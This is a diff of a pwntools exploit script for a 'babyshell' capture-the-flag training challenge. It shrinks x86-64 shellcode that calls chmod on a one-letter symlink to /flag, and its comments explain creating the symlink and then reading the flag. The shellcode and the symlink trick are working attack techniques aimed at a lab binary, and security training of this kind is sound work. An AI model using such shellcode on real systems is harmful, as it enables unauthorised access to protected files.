@@ -18,11 +18,11 @@ init-pwndbg
 continue
 '''.format(**locals())
 
-exe = './challenge/babyshell-level-8'
+exe = './challenge/babyshell-level-12'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
+context.log_level = 'info'
 
 # ===========================================================
 #                           EXPLOIT
@@ -35,26 +35,30 @@ context.log_level = 'debug'
 # offset = find_offset(exe, cyclic(500))
 # win = elf.symbols['win']
 
-# chmod flag to allow reading
-# 6 is the permission flag
+# CHALLENGE DESC
+# Write and execute shellcode to read the flag, but this time you only get 12 bytes!
+# Yep
+# In order to do this, you need to create a symlink to flag inside the workspace and make its name
+# only 1 byte, 'ln -s /flag f', then from the same directory, run the script
+
 assembly = """
-    push 0x67616c66
+    push 0x66
     push rsp
     pop rdi 
-
     push 6
     pop rsi
-
     push 90
     pop rax
     syscall
     """
 
-
+# CHMOD with flag as path (not /flag)
+# This means the python script needs to be run inside the '/' directory '/home/hacker'
+# then in the workspace, cat flag
 
 shellcode = asm(assembly)
-print(len(shellcode))
 print(shellcode)
+print(len(shellcode))
 
 io = start()
 
